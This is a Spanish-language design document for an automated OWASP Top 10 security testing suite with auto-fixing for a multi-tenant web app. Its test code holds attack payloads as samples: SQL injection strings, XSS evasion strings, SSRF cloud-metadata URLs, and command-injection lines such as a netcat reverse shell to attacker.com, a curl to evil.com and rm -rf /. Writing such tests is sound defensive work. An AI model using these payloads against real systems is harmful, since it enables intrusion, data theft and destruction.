# SECURITY TESTING SUITE - Arquitectura Completa

## 🎯 OBJETIVO

Sistema de pruebas de seguridad integrado con e2e-testing-advanced que valida:
- **OWASP Top 10 2021** completo
- Seguridad multi-tenant (aislamiento entre empresas)
- Vulnerabilidades de autenticación/autorización
- Protección contra ataques XSS, SQL Injection, CSRF
- Auto-healing cuando se detectan vulnerabilities

## 🔒 OWASP TOP 10 - COBERTURA COMPLETA

### 1. A01:2021 – Broken Access Control
**Qué testear:**
- Escalación de privilegios (empleado → admin)
- Acceso a recursos de otras empresas (multi-tenant leakage)
- IDOR (Insecure Direct Object References)
- Bypass de authorization headers

**Tests automatizados:**
```javascript
// Test 1: Intentar acceder a datos de otra empresa
POST /api/attendance { company_id: 11 } // Con token de company_id: 22
// Esperado: 403 Forbidden

// Test 2: Empleado intenta acceder a /api/admin/*
GET /api/admin/users { role: 'employee' }
// Esperado: 403 Forbidden

// Test 3: IDOR - Modificar ID en URL
GET /api/users/999 // ID de otra empresa
// Esperado: 403 o 404 (no 200)
```

**Auto-healing:**
- Detecta endpoints sin validación de company_id
- Sugiere agregar middleware `checkCompanyAccess()`
- Genera patch automático para agregar validación

---

### 2. A02:2021 – Cryptographic Failures
**Qué testear:**
- Passwords hasheados con bcrypt (>=10 rounds)
- Tokens JWT firmados correctamente
- HTTPS enforcement (redirect HTTP → HTTPS)
- Datos sensibles no en logs ni responses

**Tests automatizados:**
```javascript
// Test 1: Verificar que passwords están hasheados
const user = await db.users.findOne({ where: { id: 1 } });
expect(user.password).to.match(/^\$2[ayb]\$.{56}$/); // Formato bcrypt

// Test 2: JWT signature válida
const token = generateToken();
expect(() => jwt.verify(token, 'wrong-secret')).to.throw();

// Test 3: Buscar datos sensibles en responses
const response = await api.get('/api/users/1');
expect(response.body.password).to.be.undefined;
expect(response.body).to.not.have.property('password_hash');
```

**Auto-healing:**
- Detecta passwords en plaintext
- Sugiere migración a bcrypt
- Identifica secrets hardcoded en código

---

### 3. A03:2021 – Injection (SQL, NoSQL, OS Command)
**Qué testear:**
- SQL Injection en todos los endpoints
- NoSQL Injection (si aplica)
- Command Injection en uploads/exports
- LDAP Injection (si aplica)

**Tests automatizados:**
```javascript
// Test 1: SQL Injection básica
POST /api/auth/login {
  identifier: "admin' OR '1'='1",
  password: "anything"
}
// Esperado: 401 Unauthorized (NO login exitoso)

// Test 2: SQL Injection en búsqueda
GET /api/users?search='; DROP TABLE users; --
// Esperado: 400 Bad Request o results vacíos (NO error SQL)

// Test 3: Command Injection en export
POST /api/reports/export {
  filename: "report; rm -rf /"
}
// Esperado: 400 Bad Request (filename sanitizado)

// Test 4: Verificar uso de Sequelize (protección automática)
const query = `SELECT * FROM users WHERE id = ${req.params.id}`; // ❌ Vulnerable
const safe = await db.users.findOne({ where: { id: req.params.id } }); // ✅ Safe
```

**Payloads de prueba:**
```javascript
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "admin'--",
  "' UNION SELECT NULL, NULL, NULL--",
  "1' AND '1'='1",
  "' OR 1=1#",
  "' OR 'x'='x",
  "'; EXEC xp_cmdshell('dir'); --"
];

const COMMAND_INJECTION_PAYLOADS = [
  "; ls -la",
  "| cat /etc/passwd",
  "&& whoami",
  "`rm -rf /`",
  "$(curl evil.com)",
  "; nc -e /bin/sh attacker.com 4444"
];
```

**Auto-healing:**
- Detecta concatenación de strings en queries SQL
- Sugiere reemplazar con Sequelize parameterized queries
- Identifica `eval()`, `exec()`, `child_process` sin sanitización

---

### 4. A04:2021 – Insecure Design
**Qué testear:**
- Rate limiting en login/API (prevenir brute force)
- CAPTCHA en formularios públicos
- Account lockout después de N intentos fallidos
- Validación de business logic (ej: no permitir checkOut antes de checkIn)

**Tests automatizados:**
```javascript
// Test 1: Rate limiting - 100 requests en 1 segundo
const promises = Array(100).fill().map(() =>
  api.post('/api/auth/login', { identifier: 'admin', password: 'wrong' })
);
const responses = await Promise.all(promises);
const blocked = responses.filter(r => r.status === 429); // Too Many Requests
expect(blocked.length).to.be.greaterThan(90); // Al menos 90% bloqueados

// Test 2: Account lockout
for (let i = 0; i < 6; i++) {
  await api.post('/api/auth/login', { identifier: 'admin', password: 'wrong' });
}
const finalAttempt = await api.post('/api/auth/login', { identifier: 'admin', password: 'admin123' });
expect(finalAttempt.status).to.equal(423); // Locked

// Test 3: Business logic - checkOut sin checkIn
POST /api/attendance {
  user_id: 1,
  date: '2025-12-25',
  checkOutTime: '18:00:00'
  // NO checkInTime
}
// Esperado: 400 Bad Request
```

**Auto-healing:**
- Sugiere agregar express-rate-limit
- Genera código para account lockout
- Identifica business logic flaws

---

### 5. A05:2021 – Security Misconfiguration
**Qué testear:**
- Headers HTTP de seguridad (CSP, X-Frame-Options, HSTS, etc.)
- Información expuesta en error messages
- Debug mode deshabilitado en producción
- Default credentials no existen

**Tests automatizados:**
```javascript
// Test 1: Security headers
const response = await api.get('/');
expect(response.headers).to.have.property('x-content-type-options', 'nosniff');
expect(response.headers).to.have.property('x-frame-options', 'DENY');
expect(response.headers).to.have.property('strict-transport-security');
expect(response.headers).to.have.property('content-security-policy');

// Test 2: Error messages no exponen stack traces
const response = await api.get('/api/nonexistent');
expect(response.body).to.not.have.property('stack');
expect(response.body.error).to.not.include('at Function');

// Test 3: Default credentials deshabilitadas
const response = await api.post('/api/auth/login', {
  identifier: 'admin',
  password: 'admin' // Default común
});
expect(response.status).to.equal(401);
```

**Auto-healing:**
- Agrega helmet.js automáticamente
- Configura CSP restrictivo
- Reemplaza error handlers que exponen info sensible

---

### 6. A06:2021 – Vulnerable and Outdated Components
**Qué testear:**
- npm audit (vulnerabilidades en dependencias)
- Versiones de Node.js, PostgreSQL, etc.
- CVEs conocidos en librerías usadas
- Dependencias sin uso (attack surface)

**Tests automatizados:**
```javascript
// Test 1: npm audit (ejecutar en CI/CD)
const { execSync } = require('child_process');
const auditOutput = execSync('npm audit --json').toString();
const audit = JSON.parse(auditOutput);

expect(audit.metadata.vulnerabilities.critical).to.equal(0);
expect(audit.metadata.vulnerabilities.high).to.equal(0);

// Test 2: Versiones de dependencias críticas
const packageJson = require('../package.json');
const express = packageJson.dependencies.express;
expect(semver.satisfies(express, '>=4.18.0')); // Versión sin CVEs conocidos

// Test 3: Verificar Node.js version
const nodeVersion = process.version;
expect(semver.gte(nodeVersion, '18.0.0')); // Node 18+ recomendado
```

**Auto-healing:**
- Ejecuta `npm audit fix` automáticamente
- Sugiere actualización de dependencias críticas
- Identifica dependencias no usadas para remover

---

### 7. A07:2021 – Identification and Authentication Failures
**Qué testear:**
- Brute force protection (rate limiting)
- Session fixation attacks
- JWT expiration (tokens no duran para siempre)
- Password complexity requirements
- MFA (Multi-Factor Authentication) si aplica

**Tests automatizados:**
```javascript
// Test 1: JWT expiration
const expiredToken = jwt.sign({ userId: 1 }, JWT_SECRET, { expiresIn: '1ms' });
await sleep(10);
const response = await api.get('/api/users/me', {
  headers: { Authorization: `Bearer ${expiredToken}` }
});
expect(response.status).to.equal(401);

// Test 2: Password complexity
const weakPasswords = ['123456', 'password', 'qwerty', 'admin'];
for (const pwd of weakPasswords) {
  const response = await api.post('/api/users', {
    email: 'test@test.com',
    password: pwd
  });
  expect(response.status).to.equal(400);
  expect(response.body.error).to.include('Password too weak');
}

// Test 3: Session fixation
const sessionId1 = await login('admin', 'admin123');
await logout(sessionId1);
const response = await api.get('/api/users/me', {
  headers: { 'X-Session-ID': sessionId1 }
});
expect(response.status).to.equal(401); // Session invalidada
```

**Auto-healing:**
- Agrega validación de password strength
- Configura JWT expiration si falta
- Sugiere implementar refresh tokens

---

### 8. A08:2021 – Software and Data Integrity Failures
**Qué testear:**
- Integridad de datos (checksums, digital signatures)
- CI/CD pipeline seguro (no ejecutar código sin verificar)
- Deserialization attacks
- Auto-updates seguros

**Tests automatizados:**
```javascript
// Test 1: Verificar que no se usa eval() o Function()
const codebase = await fs.readdir('./src', { recursive: true });
for (const file of codebase.filter(f => f.endsWith('.js'))) {
  const content = await fs.readFile(file, 'utf-8');
  expect(content).to.not.include('eval(');
  expect(content).to.not.match(/new Function\(/);
}

// Test 2: Deserialization segura
POST /api/import {
  data: 'O:8:"stdClass":1:{s:4:"exec";s:10:"rm -rf /";}'
}
// Esperado: 400 Bad Request (no ejecutar)

// Test 3: Verificar que dependencies tienen integrity hashes en package-lock.json
const packageLock = require('../package-lock.json');
for (const pkg of Object.keys(packageLock.packages)) {
  if (pkg !== '') { // Skip root
    expect(packageLock.packages[pkg]).to.have.property('integrity');
  }
}
```

**Auto-healing:**
- Detecta uso de eval() y sugiere alternativas
- Valida package-lock.json integrity
- Identifica deserialización insegura

---

### 9. A09:2021 – Security Logging and Monitoring Failures
**Qué testear:**
- Logs de eventos críticos (login, logout, cambios de permisos)
- Logs no contienen datos sensibles (passwords, tokens)
- Alertas automáticas ante patrones sospechosos
- Retention policy de logs (90 días mínimo)

**Tests automatizados:**
```javascript
// Test 1: Login events se logean
await api.post('/api/auth/login', { identifier: 'admin', password: 'admin123' });
const logs = await db.audit_logs.findAll({
  where: { event_type: 'login', created_at: { [Op.gte]: new Date(Date.now() - 5000) } }
});
expect(logs.length).to.be.greaterThan(0);

// Test 2: Logs no contienen passwords
const allLogs = await db.audit_logs.findAll({ limit: 1000 });
for (const log of allLogs) {
  expect(JSON.stringify(log.data)).to.not.include('password');
  expect(JSON.stringify(log.data)).to.not.include('admin123');
}

// Test 3: Failed login attempts generan alerta
for (let i = 0; i < 6; i++) {
  await api.post('/api/auth/login', { identifier: 'admin', password: 'wrong' });
}
const alerts = await db.security_alerts.findAll({
  where: { alert_type: 'brute_force_attempt' }
});
expect(alerts.length).to.be.greaterThan(0);
```

**Auto-healing:**
- Agrega logging de eventos críticos faltantes
- Sanitiza logs para remover datos sensibles
- Configura alertas automáticas

---

### 10. A10:2021 – Server-Side Request Forgery (SSRF)
**Qué testear:**
- Validación de URLs en webhooks/callbacks
- Acceso a localhost/internal IPs bloqueado
- Timeout en requests externos (evitar DoS)
- Whitelist de dominios permitidos

**Tests automatizados:**
```javascript
// Test 1: SSRF a localhost
POST /api/webhooks/callback {
  url: 'http://localhost:9998/api/admin/users'
}
// Esperado: 400 Bad Request (localhost bloqueado)

// Test 2: SSRF a IP interna
POST /api/webhooks/callback {
  url: 'http://192.168.1.1/admin'
}
// Esperado: 400 Bad Request (IP privada bloqueada)

// Test 3: SSRF a cloud metadata (AWS, Azure, GCP)
const ssrfPayloads = [
  'http://169.254.169.254/latest/meta-data/', // AWS
  'http://metadata.google.internal/', // GCP
  'http://169.254.169.254/metadata/instance' // Azure
];
for (const url of ssrfPayloads) {
  const response = await api.post('/api/webhooks/callback', { url });
  expect(response.status).to.equal(400);
}
```

**Auto-healing:**
- Agrega validación de URLs con librería validator
- Bloquea IPs privadas automáticamente
- Configura timeout en fetch/axios

---

## 📊 ARQUITECTURA DEL SISTEMA

```
┌─────────────────────────────────────────────────────────────┐
│              SECURITY TESTING ORCHESTRATOR                   │
│  (backend/tests/e2e-advanced/security/SecurityOrchestrator.js)│
└────────────┬────────────────────────────────────────────────┘
             │
             ├─► 1. OWASP TOP 10 TESTERS
             │   ├─ AccessControlTester.js (A01)
             │   ├─ CryptoTester.js (A02)
             │   ├─ InjectionTester.js (A03)
             │   ├─ InsecureDesignTester.js (A04)
             │   ├─ MisconfigTester.js (A05)
             │   ├─ ComponentsTester.js (A06)
             │   ├─ AuthTester.js (A07)
             │   ├─ IntegrityTester.js (A08)
             │   ├─ LoggingTester.js (A09)
             │   └─ SSRFTester.js (A10)
             │
             ├─► 2. VULNERABILITY SCANNER
             │   ├─ Escaneo automático de código (SAST)
             │   ├─ Análisis de dependencias (npm audit)
             │   ├─ Detección de secrets en código
             │   └─ Fuzzing automático de endpoints
             │
             ├─► 3. PENETRATION TESTING SIMULATOR
             │   ├─ Ataque de fuerza bruta
             │   ├─ Escalación de privilegios
             │   ├─ Multi-tenant data leakage
             │   └─ Session hijacking
             │
             ├─► 4. SECURITY METRICS COLLECTOR
             │   ├─ Vulnerabilities count (critical/high/medium/low)
             │   ├─ Attack surface score
             │   ├─ Security posture rating (0-100)
             │   └─ Compliance score OWASP (%)
             │
             ├─► 5. REAL-TIME SECURITY DASHBOARD
             │   ├─ Live vulnerability feed
             │   ├─ Attack simulation visualizations
             │   ├─ Security score gauge
             │   └─ Auto-fix suggestions
             │
             └─► 6. AUTO-HEALING ENGINE
                 ├─ Detecta vulnerabilidad (ej: SQL Injection)
                 ├─ Genera fix (reemplazar con parameterized query)
                 ├─ Aplica patch automáticamente
                 ├─ Re-ejecuta test para validar
                 └─ Registra en security_audit_logs

```

## 🗄️ DATABASE SCHEMA

```sql
-- Tabla de auditoría de seguridad
CREATE TABLE security_audit_logs (
  id BIGSERIAL PRIMARY KEY,
  test_run_id UUID NOT NULL,
  timestamp TIMESTAMPTZ DEFAULT NOW(),

  -- OWASP Category
  owasp_category VARCHAR(10), -- 'A01', 'A02', ..., 'A10'
  owasp_name VARCHAR(100), -- 'Broken Access Control', etc.

  -- Vulnerability details
  vulnerability_type VARCHAR(100), -- 'SQL Injection', 'XSS', 'CSRF', etc.
  severity VARCHAR(20), -- 'critical', 'high', 'medium', 'low', 'info'
  cvss_score DECIMAL(3,1), -- 0.0 - 10.0
  cwe_id VARCHAR(20), -- Common Weakness Enumeration ID

  -- Test context
  endpoint VARCHAR(255),
  http_method VARCHAR(10),
  payload TEXT, -- Attack payload usado
  expected_response TEXT,
  actual_response TEXT,

  -- Status
  status VARCHAR(20), -- 'passed', 'failed', 'vulnerable', 'fixed'
  exploitable BOOLEAN DEFAULT false,

  -- Auto-fix
  fix_suggested TEXT,
  fix_applied BOOLEAN DEFAULT false,
  fix_code TEXT, -- Código del patch aplicado
  fix_file VARCHAR(255), -- Archivo modificado
  before_code TEXT, -- Código vulnerable
  after_code TEXT, -- Código corregido

  -- Compliance
  passed_owasp BOOLEAN DEFAULT false,
  compliance_notes TEXT,

  INDEX idx_test_run (test_run_id),
  INDEX idx_severity (severity),
  INDEX idx_owasp (owasp_category),
  INDEX idx_status (status)
);

-- Tabla de alertas de seguridad
CREATE TABLE security_alerts (
  id BIGSERIAL PRIMARY KEY,
  alert_type VARCHAR(50), -- 'brute_force_attempt', 'privilege_escalation', 'data_leakage'
  severity VARCHAR(20),
  source_ip VARCHAR(45),
  user_id INTEGER,
  company_id INTEGER,
  endpoint VARCHAR(255),
  payload JSONB,
  timestamp TIMESTAMPTZ DEFAULT NOW(),
  resolved BOOLEAN DEFAULT false,
  resolved_at TIMESTAMPTZ,
  resolution_notes TEXT
);

-- Tabla de scores de seguridad
CREATE TABLE security_scores (
  id BIGSERIAL PRIMARY KEY,
  test_run_id UUID NOT NULL,
  timestamp TIMESTAMPTZ DEFAULT NOW(),

  -- Overall scores
  overall_score INTEGER, -- 0-100
  attack_surface_score INTEGER, -- 0-100
  owasp_compliance_percent DECIMAL(5,2), -- 0-100%

  -- Per-category scores
  a01_access_control_score INTEGER,
  a02_crypto_score INTEGER,
  a03_injection_score INTEGER,
  a04_design_score INTEGER,
  a05_misconfig_score INTEGER,
  a06_components_score INTEGER,
  a07_auth_score INTEGER,
  a08_integrity_score INTEGER,
  a09_logging_score INTEGER,
  a10_ssrf_score INTEGER,

  -- Vulnerability counts
  critical_vulns INTEGER DEFAULT 0,
  high_vulns INTEGER DEFAULT 0,
  medium_vulns INTEGER DEFAULT 0,
  low_vulns INTEGER DEFAULT 0,

  -- Auto-fix stats
  auto_fixes_applied INTEGER DEFAULT 0,
  manual_fixes_required INTEGER DEFAULT 0
);
```

## 🚀 SECURITY TEST SCENARIOS

### Scenario 1: SQL Injection Full Suite
```javascript
// backend/tests/e2e-advanced/security/scenarios/sql-injection.spec.js

const SQL_INJECTION_VECTORS = [
  // Authentication bypass
  { payload: "admin' OR '1'='1", context: 'login', severity: 'critical' },
  { payload: "admin'--", context: 'login', severity: 'critical' },

  // Union-based
  { payload: "' UNION SELECT NULL, NULL--", context: 'search', severity: 'high' },
  { payload: "' UNION SELECT username, password FROM users--", context: 'search', severity: 'critical' },

  // Boolean-based blind
  { payload: "' AND '1'='1", context: 'filter', severity: 'medium' },
  { payload: "' AND '1'='2", context: 'filter', severity: 'medium' },

  // Time-based blind
  { payload: "'; WAITFOR DELAY '00:00:05'--", context: 'search', severity: 'high' },
  { payload: "' OR pg_sleep(5)--", context: 'search', severity: 'high' },

  // Error-based
  { payload: "' AND 1=CONVERT(int, (SELECT @@version))--", context: 'search', severity: 'high' },

  // Stacked queries
  { payload: "'; DROP TABLE users; --", context: 'any', severity: 'critical' },
  { payload: "'; INSERT INTO users (username, role) VALUES ('hacker', 'admin'); --", context: 'any', severity: 'critical' }
];

describe('OWASP A03: SQL Injection Tests', () => {
  for (const vector of SQL_INJECTION_VECTORS) {
    test(`SQL Injection: ${vector.payload}`, async () => {
      const response = await testEndpoint('/api/auth/login', {
        identifier: vector.payload,
        password: 'anything'
      });

      // DEBE rechazar el payload
      expect(response.status).to.not.equal(200);
      expect(response.body).to.not.have.property('token');

      // NO debe exponer error SQL
      expect(response.body.error).to.not.include('syntax error');
      expect(response.body.error).to.not.include('pg_');
      expect(response.body.error).to.not.include('SQL');
    });
  }
});
```

### Scenario 2: Multi-Tenant Data Leakage
```javascript
// backend/tests/e2e-advanced/security/scenarios/multi-tenant-isolation.spec.js

describe('Multi-Tenant Security', () => {
  test('Empresa A no puede acceder a datos de Empresa B', async () => {
    // Login como Empresa A
    const tokenA = await login({ companyId: 11 });

    // Intentar acceder a asistencias de Empresa B
    const response = await api.get('/api/attendance', {
      headers: { Authorization: `Bearer ${tokenA}` },
      params: { company_id: 22 } // ← ATAQUE: cambiar company_id
    });

    // DEBE retornar solo datos de Empresa A (11), NO de B (22)
    expect(response.status).to.equal(200);
    expect(response.body.every(r => r.company_id === 11)).to.be.true;
    expect(response.body.some(r => r.company_id === 22)).to.be.false;
  });

  test('SQL Injection para bypass de company_id', async () => {
    const tokenA = await login({ companyId: 11 });

    const response = await api.get('/api/users', {
      headers: { Authorization: `Bearer ${tokenA}` },
      params: { company_id: "11 OR 1=1" } // ← ATAQUE
    });

    // DEBE retornar 400 (validación) o solo datos de company_id 11
    if (response.status === 200) {
      expect(response.body.every(u => u.company_id === 11)).to.be.true;
    } else {
      expect(response.status).to.equal(400);
    }
  });

  test('JWT de Empresa A modificado para suplantar Empresa B', async () => {
    const tokenA = await login({ companyId: 11 });

    // Decodificar JWT, cambiar company_id a 22, re-firmar con secret incorrecto
    const decoded = jwt.decode(tokenA);
    decoded.company_id = 22;
    const fakeToken = jwt.sign(decoded, 'wrong-secret');

    const response = await api.get('/api/attendance', {
      headers: { Authorization: `Bearer ${fakeToken}` }
    });

    // DEBE rechazar (JWT signature inválido)
    expect(response.status).to.equal(401);
  });
});
```

### Scenario 3: XSS (Cross-Site Scripting)
```javascript
// backend/tests/e2e-advanced/security/scenarios/xss.spec.js

const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror="alert(1)">',
  '<svg/onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
  '<body onload="alert(1)">',
  '<input onfocus="alert(1)" autofocus>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>'
];

describe('OWASP A03: XSS Tests', () => {
  test('Reflected XSS en parámetros de búsqueda', async () => {
    for (const payload of XSS_PAYLOADS) {
      const response = await api.get(`/api/users?search=${encodeURIComponent(payload)}`);

      // Response body NO debe contener el payload sin sanitizar
      expect(response.text).to.not.include('<script>');
      expect(response.text).to.not.include('onerror=');
      expect(response.text).to.not.include('javascript:');
    }
  });

  test('Stored XSS en campos de usuario', async () => {
    const payload = '<script>alert("XSS")</script>';

    // Intentar guardar XSS en nombre de usuario
    const createResponse = await api.post('/api/users', {
      email: 'test@test.com',
      name: payload,
      password: 'Test123!'
    });

    expect(createResponse.status).to.equal(201);
    const userId = createResponse.body.id;

    // Recuperar usuario
    const getResponse = await api.get(`/api/users/${userId}`);

    // Nombre DEBE estar sanitizado (no contener <script>)
    expect(getResponse.body.name).to.not.include('<script>');
    // Debería ser: &lt;script&gt; o similar
  });

  test('DOM-based XSS en frontend', async ({ page }) => {
    await page.goto('http://localhost:9998/panel-empresa.html');

    // Inyectar payload en input
    await page.fill('#searchInput', '<img src=x onerror="alert(1)">');
    await page.click('#searchButton');

    // NO debe ejecutarse JavaScript (no debe haber alert)
    const dialogPromise = new Promise(resolve => {
      page.on('dialog', dialog => {
        resolve(dialog.message());
        dialog.dismiss();
      });
      setTimeout(() => resolve(null), 2000);
    });

    const dialogMessage = await dialogPromise;
    expect(dialogMessage).to.be.null; // No hubo alert
  });
});
```

## 📡 REAL-TIME SECURITY DASHBOARD API

### GET /api/security/live-feed
WebSocket endpoint que emite vulnerabilidades en tiempo real:

```javascript
{
  "test_run_id": "sec-abc-123",
  "timestamp": "2025-12-25T10:30:00Z",
  "current_test": "OWASP A03: SQL Injection",
  "progress": {
    "completed": 147,
    "total": 200,
    "percent": 73.5
  },
  "vulnerabilities": [
    {
      "id": "vuln-001",
      "owasp": "A03",
      "type": "SQL Injection",
      "severity": "critical",
      "cvss": 9.8,
      "endpoint": "/api/auth/login",
      "payload": "admin' OR '1'='1",
      "exploitable": true,
      "fix_suggested": "Use parameterized queries with Sequelize",
      "fix_code": "await db.users.findOne({ where: { identifier: req.body.identifier } })"
    }
  ],
  "security_score": {
    "overall": 67,
    "owasp_compliance": 78.5,
    "by_category": {
      "A01": 85,
      "A02": 92,
      "A03": 45, // ← Vulnerable!
      "A04": 70,
      "A05": 88,
      "A06": 60,
      "A07": 75,
      "A08": 80,
      "A09": 65,
      "A10": 90
    }
  },
  "alerts": [
    {
      "level": "critical",
      "message": "SQL Injection vulnerability detected in authentication endpoint",
      "action_required": "Apply auto-fix or review code manually"
    }
  ]
}
```

## 🔄 AUTO-HEALING WORKFLOW

```javascript
// Pseudo-código del auto-healing para seguridad

class SecurityAutoHealer {
  async analyzeVulnerability(vuln) {
    switch(vuln.type) {
      case 'SQL Injection':
        return await this.fixSQLInjection(vuln);

      case 'XSS':
        return await this.fixXSS(vuln);

      case 'Missing Security Headers':
        return await this.addSecurityHeaders(vuln);

      case 'Weak Password Policy':
        return await this.enforcePasswordPolicy(vuln);

      default:
        return { autoFixable: false, suggestion: '...' };
    }
  }

  async fixSQLInjection(vuln) {
    // 1. Analizar código vulnerable
    const fileContent = await fs.readFile(vuln.file, 'utf-8');
    const vulnerableLine = fileContent.split('\n')[vuln.line];

    // 2. Detectar pattern: string concatenation en query
    if (/`SELECT.*\$\{.*\}`/.test(vulnerableLine)) {
      // Pattern: Template literal con variables
      const fix = this.convertToSequelizeQuery(vulnerableLine);

      // 3. Aplicar fix
      await this.applyPatch(vuln.file, vulnerableLine, fix);

      // 4. Re-ejecutar test
      const retest = await this.runTest(vuln.test_id);

      return {
        applied: true,
        before: vulnerableLine,
        after: fix,
        retest_passed: retest.status === 'passed'
      };
    }

    return { autoFixable: false };
  }

  async addSecurityHeaders(vuln) {
    // 1. Verificar si helmet.js está instalado
    const packageJson = require('../package.json');
    if (!packageJson.dependencies.helmet) {
      // Instalar helmet
      execSync('npm install helmet');
    }

    // 2. Agregar a server.js
    const serverJs = await fs.readFile('./server.js', 'utf-8');
    const helmetImport = "const helmet = require('helmet');";
    const helmetUse = "app.use(helmet());";

    if (!serverJs.includes(helmetImport)) {
      const fixed = serverJs.replace(
        /(const express = require\('express'\);)/,
        `$1\n${helmetImport}`
      );
      const finalFixed = fixed.replace(
        /(const app = express\(\);)/,
        `$1\n${helmetUse}`
      );

      await fs.writeFile('./server.js', finalFixed);

      return { applied: true, restart_required: true };
    }

    return { applied: false, reason: 'helmet already configured' };
  }

  async enforcePasswordPolicy(vuln) {
    // 1. Agregar validación de password strength
    const validationCode = `
function validatePasswordStrength(password) {
  const minLength = 8;
  const hasUpperCase = /[A-Z]/.test(password);
  const hasLowerCase = /[a-z]/.test(password);
  const hasNumbers = /\\d/.test(password);
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

  if (password.length < minLength) {
    throw new Error('Password must be at least 8 characters');
  }
  if (!hasUpperCase || !hasLowerCase) {
    throw new Error('Password must contain uppercase and lowercase letters');
  }
  if (!hasNumbers) {
    throw new Error('Password must contain at least one number');
  }
  if (!hasSpecialChar) {
    throw new Error('Password must contain at least one special character');
  }

  return true;
}
    `;

    // 2. Agregar a archivo de utilidades
    await fs.writeFile('./src/utils/passwordValidator.js', validationCode);

    // 3. Agregar import en auth routes
    const authRoutes = await fs.readFile('./src/routes/auth.js', 'utf-8');
    const fixed = authRoutes.replace(
      /(const bcrypt = require\('bcrypt'\);)/,
      `$1\nconst { validatePasswordStrength } = require('../utils/passwordValidator');`
    );

    // 4. Agregar validación en registro
    const finalFixed = fixed.replace(
      /(router\.post\('\/register'.*?async.*?\{)/s,
      `$1\n  validatePasswordStrength(req.body.password);`
    );

    await fs.writeFile('./src/routes/auth.js', finalFixed);

    return { applied: true };
  }
}
```

## 🎯 SUCCESS CRITERIA

| Categoría OWASP | Target Score | Tests | Auto-Fixable |
|------------------|--------------|-------|--------------|
| A01: Access Control | >90% | 25 tests | 60% |
| A02: Crypto Failures | >95% | 15 tests | 80% |
| A03: Injection | >95% | 50 tests | 70% |
| A04: Insecure Design | >85% | 20 tests | 40% |
| A05: Misconfiguration | >90% | 18 tests | 90% |
| A06: Vulnerable Components | >95% | 10 tests | 95% |
| A07: Auth Failures | >90% | 22 tests | 65% |
| A08: Integrity Failures | >85% | 12 tests | 50% |
| A09: Logging Failures | >80% | 15 tests | 75% |
| A10: SSRF | >95% | 13 tests | 85% |
| **OVERALL** | **>90%** | **200 tests** | **72%** |

**Compliance Requirements:**
- 0 vulnerabilidades críticas (CVSS >= 9.0)
- <3 vulnerabilidades altas (CVSS >= 7.0)
- <10 vulnerabilidades medias (CVSS >= 4.0)
- Security score global >= 90/100
- OWASP compliance >= 90%

## 🚀 NEXT STEPS

1. ✅ Crear estructura de archivos
2. ✅ Implementar SecurityOrchestrator.js
3. ✅ Implementar 10 testers OWASP (uno por categoría)
4. ✅ Crear tabla security_audit_logs
5. ✅ Implementar VulnerabilityScanner (SAST)
6. ✅ Implementar PenetrationTestingSimulator
7. ✅ Implementar SecurityMetricsCollector
8. ✅ Crear Security Dashboard frontend
9. ✅ Implementar Auto-Healing Engine
10. ✅ Integrar con e2e-testing-advanced module
11. ✅ Ejecutar primer security audit completo

**ESTIMACIÓN**: 4-5 días de desarrollo + 2 días de tuning

## 📚 REFERENCIAS

- OWASP Top 10 2021: https://owasp.org/Top10/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- CWE List: https://cwe.mitre.org/
- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- XSS Filter Evasion: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
